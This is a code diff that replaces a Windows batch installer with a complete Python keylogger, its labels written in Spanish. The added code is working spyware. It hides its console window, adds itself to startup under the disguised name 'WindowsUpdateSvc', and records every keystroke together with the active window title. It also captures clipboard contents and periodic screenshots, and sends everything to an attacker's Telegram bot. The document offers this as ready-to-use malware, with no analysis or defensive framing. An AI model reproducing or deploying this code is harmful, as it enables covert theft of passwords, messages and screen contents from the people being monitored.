@@ -1,19 +1,102 @@
-@echo off
-title KEYLOGGER AUTOMATICO
-echo ========================================
-echo     INSTALANDO KEYLOGGER NUCLEAR
-echo ========================================
-echo.
+import time, datetime, threading, requests, os, sys, win32clipboard, pyautogui, win32gui, winreg as reg, ctypes
+from pynput import keyboard
 
-pip install pynput requests pyautogui pillow pywin32 --quiet
+TELEGRAM_TOKEN = "PEGA_AQUI_TU_TOKEN"
+CHAT_ID = "PEGA_AQUI_TU_CHAT_ID"
 
-echo.
-echo Instalacion terminada.
-echo.
-echo Iniciando Keylogger...
-echo (Se ocultara automaticamente)
+SEND_INTERVAL = 8
+SCREENSHOT_INTERVAL = 30
 
-timeout /t 3 >nul
-python keylogger.py
+log_buffer = ""
+last_send = time.time()
+last_screenshot = time.time()
+lock = threading.Lock()
 
-pause
+def add_to_startup():
+    try:
+        script_path = os.path.abspath(__file__)
+        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
+        reg.SetValueEx(key, "WindowsUpdateSvc", 0, reg.REG_SZ, f'"{sys.executable}" "{script_path}"')
+        reg.CloseKey(key)
+    except: pass
+
+def get_active_window():
+    try: return win32gui.GetWindowText(win32gui.GetForegroundWindow())[:50]
+    except: return "Unknown"
+
+def get_clipboard():
+    try:
+        win32clipboard.OpenClipboard()
+        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
+        win32clipboard.CloseClipboard()
+        return data
+    except: return None
+
+def send_to_telegram(msg, photo=None):
+    try:
+        if photo:
+            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
+            files = {'photo': open(photo, 'rb')}
+            requests.post(url, data={"chat_id": CHAT_ID, "caption": msg}, files=files)
+            os.remove(photo)
+        else:
+            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+            requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})
+    except: pass
+
+def take_screenshot():
+    try:
+        filename = f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+        pyautogui.screenshot(filename)
+        return filename
+    except: return None
+
+def on_press(key):
+    global log_buffer, last_send
+    try:
+        char = key.char if hasattr(key, 'char') and key.char else f"[{str(key).replace('Key.', '').upper()}]"
+    except: char = "[UNKNOWN]"
+
+    window = get_active_window()
+    ts = datetime.datetime.now().strftime("%H:%M:%S")
+    entry = f"[{ts}] [{window}] {char}\n"
+
+    with lock:
+        log_buffer += entry
+        if (time.time() - last_send > SEND_INTERVAL) or len(log_buffer) > 900:
+            if log_buffer.strip():
+                msg = f"<b>🔴 KEYLOGGER NUCLEAR</b>\nPC: {os.getenv('COMPUTERNAME')}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n{log_buffer}"
+                threading.Thread(target=send_to_telegram, args=(msg,), daemon=True).start()
+                log_buffer = ""
+                last_send = time.time()
+
+def screenshot_thread():
+    global last_screenshot
+    while True:
+        if time.time() - last_screenshot >= SCREENSHOT_INTERVAL:
+            photo = take_screenshot()
+            if photo:
+                threading.Thread(target=send_to_telegram, args=(f"📸 Captura {datetime.datetime.now().strftime('%H:%M:%S')}", photo), daemon=True).start()
+            last_screenshot = time.time()
+        time.sleep(5)
+
+def clipboard_thread():
+    last = ""
+    while True:
+        clip = get_clipboard()
+        if clip and clip != last and len(str(clip)) > 3:
+            last = clip
+            threading.Thread(target=send_to_telegram, args=(f"<b>📋 PORTAPAPELES</b>\n\n{clip}",), daemon=True).start()
+        time.sleep(4)
+
+if __name__ == "__main__":
+    try:
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except: pass
+
+    add_to_startup()
+    threading.Thread(target=screenshot_thread, daemon=True).start()
+    threading.Thread(target=clipboard_thread, daemon=True).start()
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
